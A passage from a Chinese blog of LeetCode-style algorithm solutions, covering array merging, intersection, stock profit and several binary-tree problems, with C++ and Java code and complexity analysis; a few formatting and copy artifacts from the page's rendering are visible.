i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="合并两个有序数组"><a href="#合并两个有序数组" class="headerlink" title="合并两个有序数组"></a>合并两个有序数组</h3><p>给你两个按 非递减顺序 排列的整数数组 nums1 和 nums2，另有两个整数 m 和 n ，分别表示 nums1 和 nums2 中的元素数目。</p><p>请你 合并 nums2 到 nums1 中，使合并后的数组同样按 非递减顺序 排列。</p><p>注意：最终，合并后数组不应由函数返回，而是存储在数组 nums1 中。为了应对这种情况，nums1 的初始长度为 m + n，其中前 m 个元素表示应合并的元素，后 n 个元素为 0 ，应忽略。nums2 的长度为 n 。</p><blockquote><p>示例 1：</p><p>输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3<br>输出：[1,2,2,3,5,6]<br>解释：需要合并 [1,2,3] 和 [2,5,6] 。<br>合并结果是 [1,2,2,3,5,6] ，其中斜体加粗标注的为 nums1 中的元素。<br>示例 2：</p><p>输入：nums1 = [1], m = 1, nums2 = [], n = 0<br>输出：[1]<br>解释：需要合并 [1] 和 [] 。<br>合并结果是 [1] 。<br>示例 3：</p><p>输入：nums1 = [0], m = 0, nums2 = [1], n = 1<br>输出：[1]<br>解释：需要合并的数组是 [] 和 [1] 。<br>合并结果是 [1] 。<br>注意，因为 m = 0 ，所以 nums1 中没有元素。nums1 中仅存的 0 仅仅是为了确保合并结果可以顺利存放到 nums1 中。</p></blockquote><p>exp </p><p><strong>一、双指针</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="keyword">int</span> m, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> p1 = <span class="number">0</span>, p2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sorted[m + n];</span><br><span class="line">        <span class="keyword">int</span> cur;</span><br><span class="line">        <span class="keyword">while</span> (p1 &lt; m || p2 &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p1 == m) &#123;</span><br><span class="line">                cur = nums2[p2++];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p2 == n) &#123;</span><br><span class="line">                cur = nums1[p1++];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[p1] &lt; nums2[p2]) &#123;</span><br><span class="line">                cur = nums1[p1++];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = nums2[p2++];</span><br><span class="line">            &#125;</span><br><span class="line">            sorted[p1 + p2 - <span class="number">1</span>] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i != m + n; ++i) &#123;</span><br><span class="line">            nums1[i] = sorted[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>复杂度分析</p><p>时间复杂度：O(m+n)<br>指针移动单调递增，最多移动 m+n次，因此时间复杂度为 O(m+n)。</p><p>空间复杂度：O(m+n)。<br>需要建立长度为 m+n 的中间数组 sorted。</p><p><strong>二、逆向双指针</strong></p><p>从后向前遍历，将两者较大的元素放在nums数组的后面而不会被覆盖，降低了空间复杂度为O(1)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="keyword">int</span> m, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> p1 = m - <span class="number">1</span>, p2 = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> tail = m + n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> cur;</span><br><span class="line">        <span class="keyword">while</span> (p1 &gt;= <span class="number">0</span> || p2 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p1 == <span class="number">-1</span>) &#123;</span><br><span class="line">                cur = nums2[p2--];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p2 == <span class="number">-1</span>) &#123;</span><br><span class="line">                cur = nums1[p1--];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[p1] &gt; nums2[p2]) &#123;</span><br><span class="line">                cur = nums1[p1--];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = nums2[p2--];</span><br><span class="line">            &#125;</span><br><span class="line">            nums1[tail--] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="两个数组的交集"><a href="#两个数组的交集" class="headerlink" title="两个数组的交集"></a>两个数组的交集</h3><p>一、哈希表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">intersect</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums1.<span class="built_in">size</span>() &gt; nums2.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">intersect</span>(nums2, nums1);</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map &lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums1) &#123;</span><br><span class="line">            ++m[num];</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums2) &#123;</span><br><span class="line">            <span class="keyword">if</span> (m.<span class="built_in">count</span>(num)) &#123;</span><br><span class="line">                intersection.<span class="built_in">push_back</span>(num);</span><br><span class="line">                --m[num];</span><br><span class="line">                <span class="keyword">if</span> (m[num] == <span class="number">0</span>) &#123;</span><br><span class="line">                    m.<span class="built_in">erase</span>(num);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(m+n), 空间复杂度：O(min(m,n))</p><p>二、双指针排序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">### 买卖股票的最佳时机</span><br><span class="line"></span><br><span class="line">&gt;输入：[<span class="number">7</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br><span class="line">&gt;输出：<span class="number">5</span></span><br><span class="line">&gt;解释：在第 <span class="number">2</span> 天（股票价格 = <span class="number">1</span>）的时候买入，在第 <span class="number">5</span> 天（股票价格 = <span class="number">6</span>）的时候卖出，最大利润 = <span class="number">6</span><span class="number">-1</span> = <span class="number">5</span> 。</span><br><span class="line">&gt;     注意利润不能是 <span class="number">7</span><span class="number">-1</span> = <span class="number">6</span>, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。</span><br><span class="line"></span><br><span class="line">exp:</span><br><span class="line"></span><br><span class="line">**动态规划**</span><br><span class="line"></span><br><span class="line">(来自题解）考虑每次如何获取最大收益，第i天的最大收益通过前i天的最低点就可以算出来。而第i天以前（包括第i天）的最低点和i<span class="number">-1</span>天的最低点有关，因此动态方程为</span><br><span class="line"></span><br><span class="line">dp[i] = <span class="built_in">min</span>(d[i<span class="number">-1</span>],prices[i])</span><br><span class="line">其中dp[<span class="number">0</span>]=prices[<span class="number">0</span>],然后动态计算之后的就可以了。 得到了前i天的最低点以后，只需要维护一个max用来保存最大收益就可以了。 时间复杂度为<span class="built_in">O</span>(n),一次遍历，空间复杂度O（n）的动态规划，代码如下：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">        <span class="comment">//dp[i]表示截止到i，价格的最低点是多少   dp[i]=min(dp[i-1],nums[i])</span></span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[prices.length];</span><br><span class="line">        dp[<span class="number">0</span>] = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            dp[i] = (dp[i - <span class="number">1</span>] &lt; prices[i]) ? dp[i - <span class="number">1</span>] : prices[i];</span><br><span class="line">            max = (prices[i] - dp[i]) &gt; max ? prices[i] - dp[i] : max;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br></pre></td></tr></table></figure><p>接着考虑优化空间，仔细观察动态规划的辅助数组，其实每一次只用到了dp[-1]这一个空间，因此可以把数组改成单个变量dp来存储截止到第i天的价格最低点。优化之后的代码就是题解中的方法二。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> inf = <span class="number">1e9</span>;</span><br><span class="line">        <span class="keyword">int</span> minprice = inf, maxprofit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> price: prices) &#123;</span><br><span class="line">            maxprofit = <span class="built_in">max</span>(maxprofit, price - minprice);</span><br><span class="line">            minprice = <span class="built_in">min</span>(price, minprice);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxprofit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>时间复杂度O(n),空间复杂度O(1)</p><h2 id="树和二叉树"><a href="#树和二叉树" class="headerlink" title="树和二叉树"></a>树和二叉树</h2><h3 id="二叉树的深度"><a href="#二叉树的深度" class="headerlink" title="二叉树的深度"></a>二叉树的深度</h3><p>输入一棵二叉树的根节点，求该树的深度。从根节点到叶节点依次经过的节点（含根、叶节点）形成树的一条路径，最长路径的长度为树的深度。</p><p>例如：</p><p>给定二叉树 [3,9,20,null,null,15,7]，</p><blockquote><p>​    3</p></blockquote><blockquote><p>  / <br>  9  20<br>    /  <br>   15   7<br>返回它的最大深度 3 。</p></blockquote><h4 id="法一：DFS"><a href="#法一：DFS" class="headerlink" title="法一：DFS"></a>法一：DFS</h4><p>树的深度等于左子树的深度和右子树深度的最大值+1</p><p><img src="https://pic.leetcode-cn.com/9b063f1f2b7ba125b97a2a11c5f774c0f8ff4df594696993a8eb8282750dae0d-Picture1.png" alt="Picture1.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> leftdeep=<span class="built_in">maxDepth</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">int</span> rightdeep = <span class="built_in">maxDepth</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(leftdeep,rightdeep)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="对称二叉树"><a href="#对称二叉树" class="headerlink" title="对称二叉树"></a>对称二叉树</h3><blockquote><p>请实现一个函数，用来判断一棵二叉树是不是对称的。如果一棵二叉树和它的镜像一样，那么它是对称的。</p><p>例如，二叉树 [1,2,2,3,4,4,3] 是对称的。</p><p>   1<br>  / <br> 2   2<br>/ \ / <br>3  4 4  3<br>但是下面这个 [1,2,2,null,3,null,3] 则不是镜像对称的:</p><p>   1<br>  / <br> 2   2<br>  \   <br>  3    3</p></blockquote><p>题解：</p><p>双指针递归剪枝，结束条件为左右指针同时都为空指针返回true，如果值不同或只有一个为空返回false</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        TreeNode *l=root;</span><br><span class="line">        TreeNode *r=root;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">recv</span>(l,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">recv</span><span class="params">(TreeNode * l,TreeNode *r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l==<span class="literal">NULL</span>&amp;&amp;r==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(l==<span class="literal">NULL</span>||r==<span class="literal">NULL</span>||l-&gt;val!=r-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;     <span class="comment">//上面两个位置不能调换</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">recv</span>(l-&gt;left,r-&gt;right)&amp;&amp;<span class="built_in">recv</span>(l-&gt;right,r-&gt;left);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h3><p>平衡二叉树的定义是：二叉树的每个节点的左右子树的高度差的绝对值不超过 11，则二叉树是平衡二叉树。根据定义，一棵二叉树是平衡二叉树，当且仅当其所有子树也都是平衡二叉树，因此可以使用递归的方式判断二叉树是不是平衡二叉树，递归的顺序可以是自顶向下或者自底向上。</p><h4 id="法一：-自顶向下递归"><a href="#法一：-自顶向下递归" class="headerlink" title="法一： 自顶向下递归"></a>法一： 自顶向下递归</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">height</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">height</span>(root-&gt;left), <span class="built_in">height</span>(root-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(<span class="built_in">height</span>(root-&gt;left) - <span class="built_in">height</span>(root-&gt;right)) &lt;= <span class="number">1</span> &amp;&amp; <span class="built_in">isBalanced</span>(root-&gt;left) &amp;&amp; <span class="built_in">isBalanced</span>(root-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>复杂度分析</p><p>时间复杂度：O(n^2)，其中 n 是二叉树中的节点个数。<br>最坏情况下，二叉树是满二叉树，需要遍历二叉树中的所有节点，时间复杂度是 O(n)。<br>对于节点 p，如果它的高度是 d，则 \texttt{height}(p)height(p) 最多会被调用 dd 次（即遍历到它的每一个祖先节点时）。对于平均的情况，一棵树的高度 h 满足 O(h)=O(\log n)O(h)=O(logn)，因为 d \leq hd≤h，所以总时间复杂度为 O(n \log n)。对于最坏的情况，二叉树形成链式结构，高度为 O(n)，此时总时间复杂度为 O(n^2)</p><p>空间复杂度：O(n)，其中 n 是二叉树中的节点个数。空间复杂度主要取决于递归调用的层数，递归调用的层数不会超过 n。</p><h4 id="法二：-自底向上递归"><a href="#法二：-自底向上递归" class="headerlink" title="法二： 自底向上递归"></a>法二： 自底向上递归</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">height</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> leftHeight = <span class="built_in">height</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">int</span> rightHeight = <span class="built_in">height</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span> (leftHeight == <span class="number">-1</span> || rightHeight == <span class="number">-1</span> || <span class="built_in">abs</span>(leftHeight - rightHeight) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(leftHeight, rightHeight) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">height</span>(root) &gt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>复杂度分析</p><p>时间复杂度：O(n)，其中 n 是二叉树中的节点个数。使用自底向上的递归，每个节点的计算高度和判断是否平衡都只需要处理一次，最坏情况下需要遍历二叉树中的所有节点，因此时间复杂度是 O(n)。</p><p>空间复杂度：O(n)，其中 n 是二叉树中的节点个数。空间复杂度主要取决于递归调用的层数，递归调用的层数不会超过 n。</p><h3 id="二叉树剪枝"><a href="#二叉树剪枝" class="headerlink" title="二叉树剪枝"></a>二叉树剪枝</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201262036538.png" alt="image-20220126203658273"></p><p>后序遍历dfs</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">pruneTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        TreeNode *leftnode = <span class="built_in">pruneTree</span>(root-&gt;left);</span><br><span class="line">        TreeNode *rightnode = <span class="built_in">pruneTree</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val==<span class="number">0</span> &amp;&amp; leftnode==<span class="literal">NULL</span>&amp;&amp;rightnode == <span class="literal">NULL</span> )</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        root-&gt;left = leftnode;</span><br><span class="line">        root-&gt;right= rightnode;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="寻找最近公共祖先"><a href="#寻找最近公共祖先" class="headerlink" title="寻找最近公共祖先"></a>寻找最近公共祖先</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201262218379.png" alt="image-20220126221803111"></p><h4 id="法一：递归"><a href="#法一：递归" class="headerlink" title="法一：递归"></a>法一：递归</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode* ans;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;   </span><br><span class="line">        <span class="keyword">bool</span> lson = <span class="built_in">dfs</span>(root-&gt;left, p, q);</span><br><span class="line">        <span class="keyword">bool</span> rson = <span class="built_in">dfs</span>(root-&gt;right, p, q);</span><br><span class="line">        <span class="keyword">if</span> ((lson 